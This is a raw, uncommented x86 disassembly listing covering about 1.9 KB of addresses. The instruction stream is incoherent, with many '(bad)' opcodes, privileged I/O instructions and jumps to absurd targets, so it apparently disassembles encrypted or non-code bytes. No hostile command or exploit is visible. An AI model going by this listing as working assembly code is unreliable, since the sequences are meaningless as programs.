  41a82c:	mov    eax,0x8f2a5bfc
  41a831:	dec    edx
  41a832:	call   0x4afcc8cf
  41a837:	rol    ah,1
  41a839:	add    DWORD PTR [eax-0xe9c584f],ebx
  41a83f:	(bad)  
  41a840:	rcr    BYTE PTR [edx],1
  41a842:	pop    esp
  41a843:	sbb    ah,BYTE PTR [edx+0x4ba83299]
  41a849:	int3   
  41a84a:	test   BYTE PTR [esi],0x8b
  41a84d:	push   0x2f8b1a08
  41a852:	and    DWORD PTR [eax],0xd734b85
  41a858:	adc    DWORD PTR [edi+eiz*2+0x71],ecx
  41a85c:	mov    ebx,0xe33a4415
  41a861:	xchg   bp,ax
  41a863:	(bad)  
  41a865:	or     al,0xb0
  41a867:	fwait
  41a868:	cmp    dh,BYTE PTR [ebx-0x38e3eecf]
  41a86e:	dec    eax
  41a86f:	mov    edi,0x34272aee
  41a874:	push   ds
  41a875:	ret    0xd3e2
  41a878:	imul   ecx,DWORD PTR [ebx-0x68],0xffffffdb
  41a87c:	stos   DWORD PTR es:[edi],eax
  41a87d:	mov    ebx,0x1bab7b95
  41a882:	call   0xb863a2f3
  41a887:	mov    al,0x93
  41a889:	retf   
  41a88a:	mov    dl,0xd8
  41a88c:	repnz sub BYTE PTR [edi],bh
  41a88f:	inc    edx
  41a890:	sub    al,0xfc
  41a892:	sar    ch,0x78
  41a895:	pop    esi
  41a896:	scas   al,BYTE PTR es:[edi]
  41a897:	out    0x96,eax
  41a899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a89a:	enter  0xb147,0x4f
  41a89e:	sub    eax,0x9005200f
  41a8a3:	fs in  al,dx
  41a8a5:	mov    bl,0xe6
  41a8a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8a8:	push   ebx
  41a8a9:	pop    ss
  41a8aa:	adc    ah,dh
  41a8ac:	mov    ah,0x48
  41a8ae:	in     al,dx
  41a8af:	loopne 0x41a89b
  41a8b1:	arpl   bx,bx
  41a8b3:	fisub  DWORD PTR [esi+0x49]
  41a8b6:	or     DWORD PTR [ecx+0x54558850],edi
  41a8bc:	enter  0xa389,0xbe
  41a8c0:	add    BYTE PTR [ecx+ecx*4+0x3279ed65],0x70
  41a8c8:	pop    esi
  41a8c9:	or     DWORD PTR [ebp+0x3],0xb93a2072
  41a8d0:	(bad)  
  41a8d1:	push   0xffffffb4
  41a8d3:	ret    0x8276
  41a8d6:	ins    DWORD PTR es:[edi],dx
  41a8d7:	in     eax,0x63
  41a8d9:	adc    ch,BYTE PTR [ebx+edi*2+0x1a54ea52]
  41a8e0:	mov    WORD PTR [ecx],es
  41a8e2:	hlt    
  41a8e3:	ja     0x41a8b0
  41a8e5:	cs dec edx
  41a8e7:	dec    eax
  41a8e8:	ja     0x41a873
  41a8ea:	test   al,0x9a
  41a8ec:	fsub   st(5),st
  41a8ee:	lods   al,BYTE PTR ds:[esi]
  41a8ef:	cld    
  41a8f0:	cmp    esp,0x19
  41a8f3:	in     eax,dx
  41a8f4:	ins    DWORD PTR es:[edi],dx
  41a8f5:	fs ret 0x8861
  41a8f9:	dec    edi
  41a8fa:	sub    cl,BYTE PTR [ecx+0x16fb2b7c]
  41a900:	or     eax,0x54019b8e
  41a905:	sbb    eax,0xfcb6209a
  41a90a:	xchg   esp,eax
  41a90b:	or     eax,0x70ff6368
  41a910:	sti    
  41a911:	sahf   
  41a912:	jbe    0x41a8dc
  41a914:	mov    al,ds:0xdd868c43
  41a919:	sub    dl,bh
  41a91b:	ins    BYTE PTR es:[edi],dx
  41a91c:	dec    edi
  41a91d:	and    edx,DWORD PTR [esi-0x1c]
  41a920:	popf   
  41a921:	adc    BYTE PTR [edi+0xbbdfcc8],bl
  41a927:	retf   
  41a928:	shl    DWORD PTR [eax],0x96
  41a92b:	outs   dx,DWORD PTR ds:[esi]
  41a92c:	and    dl,BYTE PTR [eax+0x6d]
  41a92f:	lods   al,BYTE PTR ds:[esi]
  41a930:	xchg   ebp,eax
  41a931:	pop    ebp
  41a932:	adc    ebx,edi
  41a934:	pop    eax
  41a935:	in     eax,dx
  41a936:	cmp    DWORD PTR [esi],0x44
  41a939:	int    0xd5
  41a93b:	(bad)  
  41a93c:	jbe    0x41a9b5
  41a93e:	cmp    al,0xcb
  41a940:	outs   dx,DWORD PTR ds:[esi]
  41a941:	fwait
  41a942:	xchg   ecx,eax
  41a943:	es jb  0x41a988
  41a946:	test   BYTE PTR [ebx-0x45c23312],ah
  41a94c:	sbb    DWORD PTR [ecx],eax
  41a94e:	popf   
  41a94f:	(bad)  
  41a950:	je     0x41a955
  41a952:	sub    edx,DWORD PTR [eax]
  41a954:	add    ebp,esp
  41a956:	inc    ecx
  41a957:	out    0x49,al
  41a959:	xlat   BYTE PTR ds:[ebx]
  41a95a:	jo     0x41a9c2
  41a95c:	fmul   st(7),st
  41a95e:	add    ebp,0x19
  41a961:	sub    BYTE PTR [edi+0x47],cl
  41a964:	lds    edx,FWORD PTR [edx+0x21c50cd8]
  41a96a:	mov    ch,0x5a
  41a96c:	dec    edx
  41a96d:	sub    eax,DWORD PTR [eax-0x629d71d0]
  41a973:	stos   BYTE PTR es:[edi],al
  41a974:	push   es
  41a975:	jecxz  0x41a943
  41a977:	fisub  WORD PTR [ebx+eiz*8+0x30]
  41a97b:	sbb    cl,BYTE PTR [ebp-0x45]
  41a97e:	cmc    
  41a97f:	adc    al,BYTE PTR [esi+eiz*1+0x67]
  41a983:	mov    bh,BYTE PTR [ebx]
  41a985:	and    eax,0x247df35b
  41a98a:	imul   esp,DWORD PTR [ebx-0x69],0x59
  41a98e:	jmp    0xe2886d55
  41a993:	dec    edx
  41a994:	push   ebp
  41a995:	(bad)  
  41a996:	(bad)  
  41a997:	(bad)  
  41a998:	xor    eax,0x992790e2
  41a99d:	test   edi,esi
  41a99f:	in     al,0x44
  41a9a1:	pop    ebx
  41a9a2:	enter  0xf5a5,0x63
  41a9a6:	aad    0x8d
  41a9a8:	dec    eax
  41a9a9:	mov    edx,0xdc8c7bd3
  41a9ae:	outs   dx,BYTE PTR ds:[esi]
  41a9af:	pusha  
  41a9b0:	xchg   esi,eax
  41a9b1:	imul   edx,eax,0xffffffb3
  41a9b4:	arpl   WORD PTR [ebx],di
  41a9b6:	or     al,0x6a
  41a9b8:	clc    
  41a9b9:	mov    ds:0x32ae6fae,eax
  41a9be:	lea    ecx,[esi]
  41a9c0:	sti    
  41a9c1:	add    eax,DWORD PTR [eax+0x21]
  41a9c4:	push   ebx
  41a9c5:	(bad)  
  41a9c7:	or     eax,0x8d76cc6
  41a9cc:	shr    BYTE PTR [ecx-0x398441b2],cl
  41a9d2:	repnz aad 0x59
  41a9d5:	mov    esp,0xf0760ea9
  41a9da:	inc    eax
  41a9db:	ins    BYTE PTR es:[edi],dx
  41a9dc:	xor    DWORD PTR fs:[ecx+0x302b2086],edx
  41a9e3:	mov    esp,0x70a04d1e
  41a9e8:	nop
  41a9e9:	cmp    ecx,DWORD PTR [ebp+0x1b81b71b]
  41a9ef:	ret    0x297f
  41a9f2:	pop    esp
  41a9f3:	dec    edi
  41a9f4:	repnz push eax
  41a9f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9f7:	imul   ebp,edi,0xffffffda
  41a9fa:	stc    
  41a9fb:	sub    ebp,DWORD PTR [ecx+0x45556b03]
  41aa01:	and    bh,BYTE PTR [edx-0x2e]
  41aa04:	cmp    al,dl
  41aa06:	clc    
  41aa07:	imul   ecx,ecx,0x67
  41aa0a:	ret    0xeb7
  41aa0d:	pop    ebp
  41aa0e:	aas    
  41aa0f:	jecxz  0x41a9d5
  41aa11:	xchg   ebx,eax
  41aa12:	mov    ah,0xcd
  41aa14:	sub    BYTE PTR [ecx+0x22bbe57],cl
  41aa1a:	cwde   
  41aa1b:	sub    DWORD PTR [eax+0x4e954559],ecx
  41aa21:	push   eax
  41aa22:	in     eax,dx
  41aa23:	std    
  41aa24:	jae    0x41aa0f
  41aa26:	popf   
  41aa27:	mov    eax,0x7afa9167
  41aa2c:	fisub  DWORD PTR [edi-0x4ca842ad]
  41aa32:	fs xchg ax,ax
  41aa35:	in     al,0xe0
  41aa37:	xor    BYTE PTR [edx],bh
  41aa39:	xlat   BYTE PTR ds:[ebx]
  41aa3a:	enter  0x4e3,0xd2
  41aa3e:	or     ecx,eax
  41aa40:	neg    dl
  41aa42:	jle    0xd3375621
  41aa48:	pop    esp
  41aa49:	(bad)  
  41aa4a:	(bad)  
  41aa4b:	jecxz  0x41a9e7
  41aa4d:	or     BYTE PTR [ecx+0x27d15e40],dl
  41aa53:	jne    0x41aa76
  41aa55:	in     eax,0x93
  41aa57:	jbe    0x41aaac
  41aa59:	inc    ebp
  41aa5a:	popa   
  41aa5b:	inc    eax
  41aa5c:	scas   al,BYTE PTR es:[edi]
  41aa5d:	inc    ebx
  41aa5e:	pop    fs
  41aa60:	cmp    eax,0xae082de8
  41aa65:	stos   DWORD PTR es:[edi],eax
  41aa66:	dec    edi
  41aa67:	shr    BYTE PTR [ebx+0x5a],1
  41aa6a:	mov    bl,0x8
  41aa6c:	jmp    0xe03d:0xcf9e8be8
  41aa73:	inc    ecx
  41aa74:	fs dec esi
  41aa76:	stc    
  41aa77:	cld    
  41aa78:	xchg   DWORD PTR ds:0x77a39291,ebp
  41aa7e:	jg     0x41aa7a
  41aa80:	cmc    
  41aa81:	mov    bl,0x1a
  41aa83:	fcmovb st,st(6)
  41aa85:	not    DWORD PTR [ebp+0x488c682d]
  41aa8b:	into   
  41aa8c:	pop    edx
  41aa8d:	inc    esi
  41aa8e:	sahf   
  41aa8f:	xchg   ebx,eax
  41aa90:	dec    ecx
  41aa91:	bound  ebx,QWORD PTR [edx]
  41aa93:	adc    al,0x34
  41aa95:	pop    es
  41aa96:	inc    esp
  41aa97:	sub    DWORD PTR [ebx+0x12b1c3be],ecx
  41aa9d:	es dec ebx
  41aa9f:	jl     0x41aaa2
  41aaa1:	test   DWORD PTR [edi],esi
  41aaa3:	aam    0xe4
  41aaa5:	sbb    al,0xe6
  41aaa7:	fiadd  WORD PTR [edi]
  41aaa9:	xchg   edx,eax
  41aaaa:	sbb    al,0x74
  41aaac:	mov    ?,WORD PTR cs:[ebx+ebx*2]
  41aab0:	push   esi
  41aab1:	lods   eax,DWORD PTR ds:[esi]
  41aab2:	and    BYTE PTR [ecx+0x53dee86b],ch
  41aab8:	and    BYTE PTR [bp+si+0x453b],0xc5
  41aabe:	mov    al,0x44
  41aac0:	jmp    0xcb085971
  41aac5:	retf   
  41aac6:	mov    ch,0xd0
  41aac8:	mov    al,0x9f
  41aaca:	rcr    DWORD PTR [ebx-0x67ceda40],cl
  41aad0:	push   0x8e47cc0e
  41aad5:	and    cl,BYTE PTR [edx+ebp*4]
  41aad8:	sub    al,0xa6
  41aada:	jmp    0x41ab32
  41aadc:	gs or  eax,0x913a468e
  41aae2:	push   es
  41aae3:	cmp    BYTE PTR [edx-0x74],0x9e
  41aae7:	sar    BYTE PTR [edi],cl
  41aae9:	or     edi,DWORD PTR [ebx*1+0x62185d6c]
  41aaf0:	and    ah,BYTE PTR [edx]
  41aaf2:	ss mov ch,0x71
  41aaf5:	adc    al,0x65
  41aaf7:	adc    dl,BYTE PTR [ecx]
  41aaf9:	in     al,0x43
  41aafb:	mov    dh,0x6
  41aafd:	add    bl,BYTE PTR [edx+eax*1]
  41ab00:	shr    BYTE PTR [ebp-0x69e7e677],0x99
  41ab07:	xor    DWORD PTR [esp+ebp*1],0x30
  41ab0b:	ror    BYTE PTR [ecx],1
  41ab0d:	repz jecxz 0x41ab6c
  41ab10:	test   eax,0x163d0a96
  41ab15:	jmp    0xad29:0x6537c3e1
  41ab1c:	jmp    0x41ab92
  41ab1e:	addr16 or eax,0xcfc36c73
  41ab24:	mov    edi,0x6159b959
  41ab29:	pop    edx
  41ab2a:	xor    al,0xb9
  41ab2c:	inc    edx
  41ab2d:	mov    WORD PTR [edi-0x47],?
  41ab30:	fsub   st,st(1)
  41ab32:	repz int3 
  41ab34:	push   edx
  41ab35:	jns    0x41aae1
  41ab37:	inc    esi
  41ab38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab39:	cmp    ch,0x22
  41ab3c:	les    esp,FWORD PTR [esi+ebp*8+0x14b72def]
  41ab43:	lahf   
  41ab44:	sbb    eax,0x4efa0fc1
  41ab49:	fld    DWORD PTR ss:[esi]
  41ab4c:	add    ecx,DWORD PTR [ebp+0x7cd7415c]
  41ab52:	test   cl,dl
  41ab54:	mov    cl,0x42
  41ab56:	into   
  41ab57:	xor    DWORD PTR [eax+0xb],0x2a
  41ab5b:	out    dx,eax
  41ab5c:	(bad)  
  41ab5e:	out    0xf4,eax
  41ab60:	xchg   ebx,eax
  41ab61:	or     ebx,esi
  41ab63:	or     eax,0xf5dcdd0d
  41ab68:	push   ebx
  41ab69:	push   ebx
  41ab6a:	or     BYTE PTR [ebp+0x33],dl
  41ab6d:	fisttp QWORD PTR [ecx+0x7d1d56b5]
  41ab73:	mov    cl,0x58
  41ab75:	inc    ebx
  41ab76:	cld    
  41ab77:	(bad)  
  41ab78:	mov    ds:0x505cda6d,eax
  41ab7d:	fucomi st,st(3)
  41ab7f:	mov    ah,0xbf
  41ab81:	clc    
  41ab82:	dec    BYTE PTR [ebp-0xa]
  41ab85:	in     al,dx
  41ab86:	aam    0x29
  41ab88:	cmc    
  41ab89:	adc    al,0x1
  41ab8b:	or     eax,0xb640802e
  41ab90:	push   esp
  41ab91:	mov    ds:0xa551aa3d,al
  41ab96:	pushf  
  41ab97:	xorps  xmm1,XMMWORD PTR [eax]
  41ab9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab9b:	push   edi
  41ab9c:	sti    
  41ab9d:	mov    bl,bh
  41ab9f:	dec    esp
  41aba0:	push   edx
  41aba1:	(bad)  
  41aba2:	pop    edi
  41aba3:	mov    al,ds:0x82af6ace
  41aba8:	pop    esi
  41aba9:	inc    esp
  41abaa:	pushf  
  41abab:	xchg   ebp,eax
  41abac:	in     al,dx
  41abad:	pop    es
  41abae:	test   DWORD PTR [edi],0x2e4ebfcb
  41abb4:	xor    eax,0x48ff1803
  41abb9:	inc    ebx
  41abba:	add    ecx,esp
  41abbc:	sbb    al,0x1f
  41abbe:	int3   
  41abbf:	mov    edi,0xcc8a8930
  41abc4:	xor    eax,0x8948eb74
  41abc9:	cmp    DWORD PTR [ebx-0x60],edi
  41abcc:	daa    
  41abcd:	sti    
  41abce:	inc    ebp
  41abcf:	stos   BYTE PTR es:[edi],al
  41abd0:	jle    0x41ac36
  41abd2:	mov    ah,0xb2
  41abd4:	pop    edi
  41abd5:	mov    edi,0x6a2bf81b
  41abda:	push   ss
  41abdb:	push   ebx
  41abdc:	rol    DWORD PTR [esi-0x151f9ed8],1
  41abe2:	rcl    DWORD PTR [ecx-0x4e],0xe
  41abe6:	sti    
  41abe7:	ror    DWORD PTR [edi+0x66],1
  41abea:	add    WORD PTR [ebx],0xffe1
  41abee:	outs   dx,BYTE PTR ds:[esi]
  41abef:	jo     0x41ac17
  41abf1:	cs push esi
  41abf3:	mov    ah,0xbc
  41abf5:	push   edi
  41abf6:	add    DWORD PTR [esi],0x73
  41abf9:	lods   al,BYTE PTR ds:[esi]
  41abfa:	mov    WORD PTR [edi+esi*2],cs
  41abfd:	(bad)  
  41abff:	mov    ebp,0xfe09de5e
  41ac04:	add    eax,0xd3ca7d60
  41ac09:	or     bl,BYTE PTR [edi]
  41ac0b:	out    0x97,al
  41ac0d:	mov    eax,0x2a3cbb39
  41ac12:	mov    ah,0x4f
  41ac14:	out    dx,eax
  41ac15:	xor    ebp,DWORD PTR [ebx+0x40]
  41ac18:	pop    edx
  41ac19:	ins    BYTE PTR es:[edi],dx
  41ac1a:	ins    DWORD PTR es:[edi],dx
  41ac1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac1c:	fidiv  WORD PTR [edx]
  41ac1e:	mov    BYTE PTR [ebp+edx*1-0x47],dl
  41ac22:	(bad)  
  41ac23:	(bad)  
  41ac24:	ins    DWORD PTR es:[edi],dx
  41ac25:	add    bl,BYTE PTR [eax]
  41ac27:	adc    DWORD PTR [eax],ecx
  41ac29:	ret    0x64b6
  41ac2c:	adc    esp,DWORD PTR [edi-0x3]
  41ac2f:	mov    ds:0x5738773b,al
  41ac34:	into   
  41ac35:	call   0xec3ff2c4
  41ac3a:	ja     0x41ac18
  41ac3c:	idiv   DWORD PTR [ebx+0x400552fe]
  41ac42:	sbb    bh,ch
  41ac44:	sub    al,0x4b
  41ac46:	or     al,0x3
  41ac48:	shl    DWORD PTR [eax],0xba
  41ac4b:	xchg   edi,eax
  41ac4c:	fcmovbe st,st(0)
  41ac4e:	cmp    al,0x6
  41ac50:	push   cs
  41ac51:	mov    bl,0x7f
  41ac53:	bound  ebp,QWORD PTR [eax-0x3fb4dce1]
  41ac59:	mov    ch,0xa3
  41ac5b:	pop    ecx
  41ac5c:	addr16 jmp 0x41acaf
  41ac5f:	test   al,0xb7
  41ac61:	(bad)  
  41ac62:	mov    al,bl
  41ac64:	dec    ebx
  41ac65:	scas   eax,DWORD PTR es:[edi]
  41ac66:	cdq    
  41ac67:	add    eax,0x5f361eb0
  41ac6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac6d:	out    0xc8,al
  41ac6f:	inc    ebx
  41ac70:	pop    ebp
  41ac71:	xchg   esi,eax
  41ac72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac73:	inc    eax
  41ac74:	mov    bl,0xcf
  41ac76:	pop    ds
  41ac77:	inc    ecx
  41ac78:	and    eax,DWORD PTR [eax]
  41ac7a:	imul   ebx,edi,0xffffff9a
  41ac7d:	fisttp WORD PTR [esi+edx*2-0x18]
  41ac81:	jo     0x41acb7
  41ac83:	mov    fs,WORD PTR [eax-0x7b726c18]
  41ac89:	sbb    ah,cl
  41ac8b:	out    dx,al
  41ac8c:	push   edx
  41ac8d:	into   
  41ac8e:	cmp    DWORD PTR [ebp-0x1c],ebx
  41ac91:	jmp    FWORD PTR [ebx]
  41ac93:	or     al,0xad
  41ac95:	pusha  
  41ac96:	xor    eax,0x15fe1230
  41ac9b:	and    DWORD PTR [ecx],esi
  41ac9d:	fwait
  41ac9e:	mov    bh,bh
  41aca0:	mov    dl,BYTE PTR gs:[esi-0x2c7db84c]
  41aca7:	repnz int 0x45
  41acaa:	arpl   WORD PTR [edx],si
  41acac:	mov    ah,0xde
  41acae:	mov    al,0x9c
  41acb0:	lds    ecx,FWORD PTR [edx-0x18]
  41acb3:	mov    cl,0xc4
  41acb5:	arpl   WORD PTR ds:0x5a0bd514,dx
  41acbb:	push   ss
  41acbc:	dec    edi
  41acbd:	sahf   
  41acbe:	inc    ecx
  41acbf:	jns    0x41ad27
  41acc1:	push   edi
  41acc2:	mov    cl,BYTE PTR [edi]
  41acc4:	(bad)  
  41acc5:	cmc    
  41acc6:	popf   
  41acc7:	call   0xa9e1:0x65453ac3
  41acce:	sub    al,0xbd
  41acd0:	les    eax,FWORD PTR [eax-0x48eb35d4]
  41acd6:	aad    0x90
  41acd8:	loop   0x41ad57
  41acda:	jl     0x41ac76
  41acdc:	ret    
  41acdd:	fnstcw WORD PTR [ebx+0x15c0bd71]
  41ace3:	mov    eax,ds:0x2303e78b
  41ace8:	sub    BYTE PTR [ebx-0x41],bh
  41aceb:	iret   
  41acec:	ja     0x41ac8c
  41acee:	pop    edx
  41acef:	mul    BYTE PTR [ebp+0x589a0aa6]
  41acf5:	push   ebp
  41acf6:	inc    edi
  41acf7:	daa    
  41acf8:	repz mov ebx,0x82855228
  41acfe:	push   cs
  41acff:	add    eax,0xce70fec0
  41ad04:	(bad)  
  41ad05:	cmp    al,BYTE PTR [edx+eiz*4-0x1bf7f20f]
  41ad0c:	jle    0x41ad08
  41ad0e:	jne    0x41ad32
  41ad10:	dec    edx
  41ad11:	call   0x4d739424
  41ad16:	adc    dl,BYTE PTR [ebp+ebp*2-0xe3bd919]
  41ad1d:	std    
  41ad1e:	cld    
  41ad1f:	jle    0x41accc
  41ad21:	sub    BYTE PTR [edi],0x2
  41ad24:	imul   edi,DWORD PTR [ecx],0x4de3cce1
  41ad2a:	mov    ch,BYTE PTR [edx-0x1aff1a85]
  41ad30:	sbb    dl,bl
  41ad32:	jmp    0x41adab
  41ad34:	cs repz in eax,dx
  41ad37:	(bad)  
  41ad38:	and    dl,bh
  41ad3a:	inc    eax
  41ad3b:	in     eax,dx
  41ad3c:	mov    edi,0x34681c55
  41ad41:	addr16 push ss
  41ad43:	test   al,0x76
  41ad45:	adc    al,0x0
  41ad47:	pop    esi
  41ad48:	loope  0x41adb5
  41ad4a:	jmp    0xf6f46f96
  41ad4f:	adc    DWORD PTR [edx],edi
  41ad51:	and    DWORD PTR [esi],0xc8e06f07
  41ad57:	xor    eax,0x84970247
  41ad5c:	and    esp,DWORD PTR [esi+0x9636e7e]
  41ad62:	fcmovb st,st(1)
  41ad64:	inc    esp
  41ad65:	pop    edx
  41ad66:	pusha  
  41ad67:	mov    ch,0x65
  41ad69:	jne    0x41acf4
  41ad6b:	fs mov dl,0xc0
  41ad6e:	jns    0x41ad88
  41ad70:	and    eax,0x68e555bb
  41ad75:	out    0x8d,eax
  41ad77:	mov    bl,0xd8
  41ad79:	shl    al,cl
  41ad7b:	stos   BYTE PTR es:[edi],al
  41ad7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad7d:	inc    edx
  41ad7e:	xor    edx,edi
  41ad80:	dec    esi
  41ad81:	lods   eax,DWORD PTR ds:[esi]
  41ad82:	sahf   
  41ad83:	and    ch,cl
  41ad85:	push   edi
  41ad86:	cmp    eax,0x8254352d
  41ad8b:	pop    eax
  41ad8c:	push   eax
  41ad8d:	hlt    
  41ad8e:	cmp    eax,0x32f00aed
  41ad93:	push   es
  41ad94:	jae    0x41ad98
  41ad96:	xor    dh,dl
  41ad98:	inc    ebp
  41ad99:	(bad)  
  41ad9a:	xor    BYTE PTR [ecx-0x58],al
  41ad9d:	(bad)  [ebx-0x16]
  41ada0:	inc    edi
  41ada1:	sti    
  41ada2:	push   cs
  41ada3:	lods   al,BYTE PTR ds:[esi]
  41ada4:	sub    ebx,DWORD PTR [edx]
  41ada6:	(bad)  
  41ada8:	icebp  
  41ada9:	ss ds pop edx
  41adac:	jl     0x41adf8
  41adae:	mov    cl,0x3c
  41adb0:	in     al,dx
  41adb1:	inc    ebx
  41adb2:	ds ss sbb eax,ecx
  41adb6:	pop    edx
  41adb7:	sbb    bl,BYTE PTR [esi-0x7d]
  41adba:	or     cl,BYTE PTR [esp+esi*8]
  41adbd:	icebp  
  41adbe:	(bad)  
  41adbf:	xor    al,0x9d
  41adc1:	inc    eax
  41adc2:	push   esp
  41adc3:	dec    esp
  41adc4:	xchg   ebp,eax
  41adc5:	push   ebp
  41adc6:	test   DWORD PTR [esi+0x27],0x1b45d068
  41adcd:	pop    esi
  41adce:	loopne 0x41ae47
  41add0:	sbb    DWORD PTR [ebx],edx
  41add2:	jp     0x41ad62
  41add4:	arpl   WORD PTR [eax-0x482c92ca],ax
  41adda:	test   BYTE PTR [ebx+0x6b3f047b],0x8e
  41ade1:	push   ebx
  41ade2:	push   0xfffffff5
  41ade4:	adc    DWORD PTR [esi-0x254c6678],esp
  41adea:	sbb    ecx,edx
  41adec:	ror    DWORD PTR [ebx+0x479083a7],1
  41adf2:	cmp    ah,ah
  41adf4:	xchg   ebx,eax
  41adf5:	ja     0x41adf9
  41adf7:	in     eax,dx
  41adf8:	ins    BYTE PTR es:[edi],dx
  41adf9:	int    0x11
  41adfb:	or     al,0xf7
  41adfd:	xor    ebx,DWORD PTR [edx]
  41adff:	xor    dh,BYTE PTR [edx-0x6bfbdc08]
  41ae05:	(bad)  
  41ae06:	fst    QWORD PTR [ecx+0x3bc80105]
  41ae0c:	xor    ebx,eax
  41ae0e:	int    0x77
  41ae10:	add    DWORD PTR [edi+ebx*2+0xf53d1ec],edx
  41ae17:	test   al,0x20
  41ae19:	jl     0x41ae8a
  41ae1b:	repz jl 0x41add7
  41ae1e:	jecxz  0x41ae58
  41ae20:	aaa    
  41ae21:	out    0xbb,al
  41ae23:	inc    eax
  41ae24:	imul   ebx,DWORD PTR [edx-0x15d2de62],0x38960a72
  41ae2e:	push   eax
  41ae2f:	scas   al,BYTE PTR es:[edi]
  41ae30:	(bad)  
  41ae31:	pushf  
  41ae32:	push   es
  41ae33:	jge    0x41ae77
  41ae35:	retf   
  41ae36:	out    0xf4,al
  41ae38:	test   eax,0xbb0ab9ca
  41ae3d:	sub    eax,0x82aa30ee
  41ae42:	inc    edi
  41ae43:	out    0xc6,eax
  41ae45:	jbe    0x41aec5
  41ae47:	std    
  41ae48:	or     dh,BYTE PTR [esi+ecx*8]
  41ae4b:	mov    dh,0x9f
  41ae4d:	jae    0x41aecd
  41ae4f:	sahf   
  41ae50:	daa    
  41ae51:	xchg   esp,eax
  41ae52:	loop   0x41adda
  41ae54:	lds    edx,FWORD PTR [edi]
  41ae56:	mov    ecx,0x53966000
  41ae5b:	out    dx,eax
  41ae5c:	lea    esp,[ecx+0x2f]
  41ae5f:	sbb    eax,0xc49ed214
  41ae64:	rcr    ebp,cl
  41ae66:	les    ebp,FWORD PTR [ebp-0x1c]
  41ae69:	and    bh,BYTE PTR [edx-0x75b3f37d]
  41ae6f:	ret    
  41ae70:	test   BYTE PTR [eax+0xd],0x35
  41ae74:	fistp  QWORD PTR [ebx]
  41ae76:	dec    eax
  41ae77:	add    BYTE PTR [ebp+0x2c],cl
  41ae7a:	mov    eax,ds:0x37635ea
  41ae7f:	loopne 0x41ae2d
  41ae81:	push   cs
  41ae82:	pop    edi
  41ae83:	out    dx,eax
  41ae84:	mov    esp,0x4744b0e8
  41ae89:	jecxz  0x41aed4
  41ae8b:	jne    0x41ae70
  41ae8d:	xchg   ebp,eax
  41ae8e:	add    dl,ch
  41ae90:	iret   
  41ae91:	stos   DWORD PTR es:[edi],eax
  41ae92:	adc    DWORD PTR [esi+0x64],eax
  41ae95:	mov    edx,0xe426d7ae
  41ae9a:	out    dx,eax
  41ae9b:	add    al,0xf0
  41ae9d:	call   0x8a97f8c4
  41aea2:	mov    dh,BYTE PTR cs:[ebx-0x20]
  41aea6:	adc    DWORD PTR [eax-0x50567ff3],esi
  41aeac:	mov    ebx,0x6696b4b3
  41aeb1:	cmp    BYTE PTR [eax+edi*8],dh
  41aeb4:	or     al,0x5
  41aeb6:	sbb    DWORD PTR [ebx],ebp
  41aeb8:	inc    ebx
  41aeb9:	inc    ecx
  41aeba:	lds    ecx,FWORD PTR [eax]
  41aebc:	loope  0x41aecd
  41aebe:	and    eax,0x2e
  41aec1:	adc    ch,ah
  41aec3:	mov    ds:0x3c18e3f7,al
  41aec8:	es jle 0x41af16
  41aecb:	dec    edx
  41aecc:	arpl   WORD PTR [edx+0x5c],ax
  41aecf:	ja     0x41ae62
  41aed1:	mov    ds:0x6e427579,eax
  41aed6:	xchg   ebx,eax
  41aed7:	push   ebp
  41aed8:	jle    0x41af05
  41aeda:	aam    0xda
  41aedc:	fwait
  41aedd:	dec    ebp
  41aede:	(bad)  
  41aedf:	ror    BYTE PTR [esi-0x3f],0x7
  41aee3:	add    al,0xa3
  41aee5:	fwait
  41aee6:	sbb    eax,0xa9c6976c
  41aeeb:	lods   al,BYTE PTR ds:[esi]
  41aeec:	retf   
  41aeed:	test   BYTE PTR [ebp+0x22],0x8
  41aef1:	mov    eax,0x67854883
  41aef6:	cmp    eax,0x4a8c8a36
  41aefb:	int    0x13
  41aefd:	je     0x41aecb
  41aeff:	pop    edx
  41af00:	pop    esi
  41af01:	ror    DWORD PTR [ebp-0xec445ed],0x0
  41af08:	(bad)  
  41af09:	lods   eax,DWORD PTR ds:[esi]
  41af0a:	fisttp WORD PTR es:[ecx+0x7967fce9]
  41af11:	mov    ds:0x24265677,eax
  41af16:	inc    ecx
  41af17:	mov    esi,0xa6bf921e
  41af1c:	jmp    0x41aeb1
  41af1e:	pop    edi
  41af1f:	adc    eax,0xb5e2e647
  41af24:	retf   0x8359
  41af27:	mov    BYTE PTR [edx+0x1d],dh
  41af2a:	mov    WORD PTR [ebp+0x2],?
  41af2d:	push   0x63
  41af2f:	cmp    dl,bh
  41af31:	outs   dx,DWORD PTR ds:[esi]
  41af32:	xor    al,0xa
  41af34:	popf   
  41af35:	adc    eax,0x127bfd08
  41af3a:	add    dl,bh
  41af3c:	call   0xc414:0x49590b9
  41af43:	sahf   
  41af44:	cmp    al,0x55
  41af46:	and    dl,BYTE PTR [edx]
  41af48:	mov    eax,0xd9915bcb
  41af4d:	les    edi,FWORD PTR [edi]
  41af4f:	(bad)  
  41af50:	loop   0x41af4b
  41af52:	pop    ds
  41af53:	retf   
  41af54:	jbe    0x41af11
  41af56:	cmp    BYTE PTR [edx+edi*8],dh
  41af59:	scas   al,BYTE PTR es:[edi]
  41af5a:	cmp    al,0x69
  41af5c:	push   edi
  41af5d:	mov    ebp,0x7b1db25a
  41af62:	cdq    
  41af63:	test   eax,0xa25b5227
  41af68:	(bad)  
  41af69:	loopne 0x41af69
  41af6b:	pop    esi
  41af6c:	mov    ds:0xd86039e2,al
  41af71:	push   ebx
  41af72:	dec    ecx
  41af73:	bound  edx,QWORD PTR [ebx+edx*2+0x78]
  41af77:	push   edi
  41af78:	cmp    ah,BYTE PTR [edx+0x6c9c64e7]
  41af7e:	arpl   si,si
  41af80:	push   cs
  41af81:	xor    al,BYTE PTR [ebx-0x3d]
  41af84:	jno    0x41af61
  41af86:	sbb    DWORD PTR [ebx-0x16faf577],0x72
